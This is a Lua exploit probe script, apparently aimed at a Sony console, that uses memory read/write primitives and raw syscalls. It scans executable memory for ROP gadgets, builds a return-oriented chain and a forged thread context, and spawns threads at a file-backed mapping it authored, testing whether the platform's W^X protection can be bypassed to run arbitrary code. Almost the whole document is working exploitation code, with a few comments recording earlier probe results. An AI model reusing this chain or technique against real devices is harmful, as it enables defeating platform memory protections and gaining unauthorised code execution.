-- CRASH_CLASS: HIGH
-- PROBE 939d: execute a file-backed mapping we authored (the W^X test)
--
-- Context: 939b/939c established, in three runs, that
--   * open(5) works when the path is a raw Lua string,
--   * /av_contents/content_tmp is writable (fd 24, write returned 8),
--   * a file mmap with prot=5 returns our own bytes (first byte 195 = 0xC3),
--   * mprotect refuses 5 and 7 on anonymous AND file mappings.
--
-- The last line is ambiguous: mprotect can be refusing X as a blanket policy
-- while the mapping itself still carries X from mmap.  The only oracle left is
-- execution, which this probe performs.
--
-- Payload file: /av_contents/content_tmp/xcode.bin, 0x3F bytes of 0xC3.
-- Section A: control spawn at fn (harness alive, writes a marker through the
--            store gadget, then exits with thr_exit(431)).
-- Section B: same chain, entry = the file mapping at prot=5.
-- Section C: only if B survived - the same with a prot=7 mapping.
--
-- Success for B/C = the marker buffer holds the value the chain wrote.  A
-- context dump and a dead process = the page is NX, which is the expected
-- answer if Sony enforces W^X at pmap level.

print("=== PROBE 939d: EXECUTE A FILE-BACKED MAPPING ===")
print("")

local function to_num(v)
    if type(v) == "table" then
        if v.tonumber then local n = v:tonumber() if n then return n end end
        if v.h then return v.h * 4294967296 + v.l end
    end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function rd(a) local o, v = pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end return nil end
local function rq(a) local o, v = pcall(function() return memory.read_qword(a) end); if o then return v end return nil end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(a, n) pcall(function() for i = 0, n - 4, 4 do memory.write_dword(a + i, 0) end end) end
local function call(f, ...)
    local ok, rv = pcall(f, ...)
    if not ok then return nil end
    return to_num(rv)
end

local fn = to_num(syscall.pipe.fn_addr)
print("[0] pid=" .. tostring(call(function() return native.fcall_with_rax(syscall.pipe.fn_addr, 20) end)))

local info = memory.alloc(0x200); wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info + 0x10C) or 0) * 4294967296 + (rd(info + 0x108) or 0)
local function find_pat(base, limit, pat)
    local off = 0
    while off < limit do
        local want = limit - off
        if want > 0x1000 then want = 0x1000 end
        local ok, s = pcall(function() return memory.read_buffer(base + off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
end
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F, 0xC3))
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58, 0xC3))
local store   = find_pat(ebase, 0x494000, string.char(0x48, 0x89, 0x07, 0xC3))
print(string.format("[0] pop_rdi=%s pop_rax=%s store=%s", tostring(pop_rdi), tostring(pop_rax), tostring(store)))

local PAGE = 0x4000
local block = call(function() return mk(477)(uint64(0), uint64(PAGE * 4), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
local marker = call(function() return mk(477)(uint64(0), uint64(PAGE), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
wd(marker, 0xDEAD0000)
local start = block + PAGE * 4 - 0x200

local ctx = memory.alloc(0x500)
local tb = memory.alloc(8)
local Ctx = { MAGIC = 0x108, TYPE = 0x110, CS = 0x0C0, RIP = 0x0E0, RSP = 0x0F8, SS = 0x100,
              RDI = 0x048, RSI = 0x050, RDX = 0x058, RCX = 0x060, R8 = 0x068, RAX = 0x078 }

local function spawn_at(entry, value, sysno)
    -- chain: pop_rdi marker | pop_rax value | store | pop_rax 431 | fn
    wq(start,      uint64(pop_rdi)); wq(start + 8,  uint64(marker))
    wq(start + 16, uint64(pop_rax)); wq(start + 24, uint64(value))
    wq(start + 32, uint64(store))
    wq(start + 40, uint64(pop_rax)); wq(start + 48, uint64(431))
    wq(start + 56, uint64(fn))
    zero(ctx, 0x500)
    wq(ctx + Ctx.MAGIC, uint64(0x480)); wq(ctx + Ctx.TYPE, uint64(0x10000)); wq(ctx + Ctx.RAX, uint64(sysno or 20))
    wq(ctx + Ctx.CS, uint64(0x43)); wq(ctx + Ctx.SS, uint64(0x3B))
    wq(ctx + Ctx.RIP, uint64(entry)); wq(ctx + Ctx.RSP, uint64(start))
    wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok, rv
end

-- A: control
print("[A] control spawn at fn:")
local okA = spawn_at(fn, 0xC0DE0001)
print(string.format("   ok=%s marker=0x%X", tostring(okA), rd(marker) or 0))
wd(marker, 0xDEAD0000)

-- B: file mapping, prot=5
local fd = call(function() return mk(5)("/av_contents/content_tmp/xcode.bin", uint64(0x202), uint64(0x1FF)) end)
print("[B] open xcode.bin = " .. tostring(fd))
local payload = call(function() return mk(477)(uint64(0), uint64(PAGE), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
for i = 0, 0x3F do pcall(function() memory.write_byte(payload + i, 0xC3) end) end
local wrote = call(function() return mk(4)(uint64(fd), uint64(payload), uint64(0x40)) end)
print("[B] write 0x40 bytes = " .. tostring(wrote))
local filemap = call(function() return mk(477)(uint64(0), uint64(PAGE), uint64(5), uint64(0x2), uint64(fd), uint64(0)) end)
print(string.format("[B] file mmap prot=5 -> %s first byte=%s", tostring(filemap), tostring(rd(filemap))))
if type(filemap) == "number" and filemap > 0 then
    print("[B] spawn at the file mapping:")
    local okB = spawn_at(filemap, 0xC0DE0002)
    print(string.format("   ok=%s marker=0x%X", tostring(okB), rd(marker) or 0))
    wd(marker, 0xDEAD0000)
end

-- C: file mapping, prot=7
if type(fd) == "number" and fd >= 0 and type(filemap) == "number" and filemap > 0 then
    local fm7 = call(function() return mk(477)(uint64(0), uint64(PAGE), uint64(7), uint64(0x2), uint64(fd), uint64(0)) end)
    print(string.format("[C] file mmap prot=7 -> %s first byte=%s", tostring(fm7), tostring(rd(fm7))))
    if type(fm7) == "number" and fm7 > 0 then
        print("[C] spawn at the prot=7 file mapping:")
        local okC = spawn_at(fm7, 0xC0DE0003)
        print(string.format("   ok=%s marker=0x%X", tostring(okC), rd(marker) or 0))
    end
end

print("")
print("=== PROBE 939d COMPLETE ===")
